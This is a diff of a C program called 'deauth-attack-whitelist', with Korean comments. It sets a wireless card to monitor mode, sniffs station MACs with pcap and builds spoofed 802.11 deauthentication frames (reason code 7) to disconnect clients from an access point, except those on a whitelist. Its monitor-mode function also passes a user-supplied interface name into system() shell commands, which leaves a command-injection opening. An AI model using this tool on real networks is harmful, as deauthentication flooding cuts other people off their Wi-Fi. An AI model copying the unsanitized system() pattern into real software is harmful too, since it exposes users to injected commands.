@@ -1,29 +1,16 @@
 #include <pthread.h>
 #include <pcap.h>
 #include <stdio.h>
+#include "beacon.c"
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
-#include "beacon.cpp"
+
 #define NULL 0x00
 #define MAC_ALEN 6
 #define MAC_ADDR_STR_LEN 17
 
-void usage(){
-    printf("syntax: deauth-attack-whitelist <interface> <ap mac> <station_mac_list> <white_list>\n");
-    printf("sample: deauth-attack-whitelist wlan0 AA:BB:CC:DD:EE:FF station_mac.txt white_list.txt  \n");
-}
-
-void monitor(char * dev){ // 랜카드 모니터 모드로 변경 함수
-    char command[100];
-    sprintf(command, "ifconfig %s down",dev);
-    system(command);
-    sprintf(command, "iwconfig %s mode monitor",dev);
-    system(command);
-    sprintf(command, "ifconfig %s up",dev);
-    system(command);
-}
 
 int ConvertMacAddrStr2Array(const char *mac_addr_str, uint8_t mac_addr[MAC_ALEN]){
     int res, i ,val;
@@ -40,6 +27,26 @@ int ConvertMacAddrStr2Array(const char *mac_addr_str, uint8_t mac_addr[MAC_ALEN]
     return 0;
 }
 
+
+void monitor(char *dev){    //랜카드 모니터 모드 설정
+    char command[50];
+    if(strlen(dev)>20){
+        printf("interface name length less than 20 characters");
+        exit(0);
+    }
+    sprintf(command, "ifconfig %s down",dev);
+    system(command);
+    sprintf(command, "iwconfig %s mode monitor",dev);
+    system(command);
+    sprintf(command, "ifconfig %s up",dev);
+    system(command);
+}
+
+
+void usage(){
+    printf("syntax: deauth-attack-whitelist <interface> <ap mac> <station_mac_list> <white_list>\n");
+    printf("sample: deauth-attack-whitelist wlan0 AA:BB:CC:DD:EE:FF station_mac.txt white_list.txt  \n");
+}
 
 void *station_mac(void *arg) {
     struct multiargs *data = arg;
@@ -62,6 +69,7 @@ void *station_mac(void *arg) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap2));
             break;
         }
+
         radiotap_len = dump_radiotap((struct radiotap_header *)packet);
         packet += radiotap_len;
         smac = dump_beacon_header((struct beacon_header *)packet);
@@ -147,11 +155,7 @@ int main(int argc, char* argv[]) {
     multiarg.white_list = argv[4];
 
     uint8_t macAddr[MAC_ALEN];
-   
-    if(strlen(dev)>30){
-        printf("interface name length less than 30 characters");
-        return -1;
-    }
+
     monitor(dev);
 
     pthread_t thread;
@@ -170,9 +174,28 @@ int main(int argc, char* argv[]) {
     }
 
     //가짜 비콘 프레임 1 생성/초기화
-    struct beacon_frame beacon;
-    struct beacon_frame beacon2;
+    struct fake_beacon beacon;
+    beacon.radiotap.version = 0x00;
+    beacon.radiotap.pad = 0x00;
+    beacon.radiotap.len = 0x000b;
+    beacon.radiotap.present = 0x00028000;
+    memset(beacon.radiotap.dummy,0x00,sizeof(uint8_t)*3);
+    beacon.becon.frame_control = 0x00c0;
+    beacon.becon.duration_id = 0x0000;
+    beacon.becon.squence_control = 0x0000;
+    beacon.fixed.reason_code = 0x07;
 
+    //가짜 비콘 프레임 2 생성/초기화
+    struct fake_beacon beacon2;
+    beacon2.radiotap.version = 0x00;
+    beacon2.radiotap.pad = 0x00;
+    beacon2.radiotap.len = 0x000b;
+    beacon2.radiotap.present = 0x00028000;
+    memset(beacon2.radiotap.dummy,0x00,sizeof(uint8_t)*3);
+    beacon2.becon.frame_control = 0x00c0;
+    beacon2.becon.duration_id = 0x0000;
+    beacon2.becon.squence_control = 0x0000;
+    beacon2.fixed.reason_code = 0x07;
 
     int ret = ConvertMacAddrStr2Array(ap_mac, macAddr);
     if (ret){
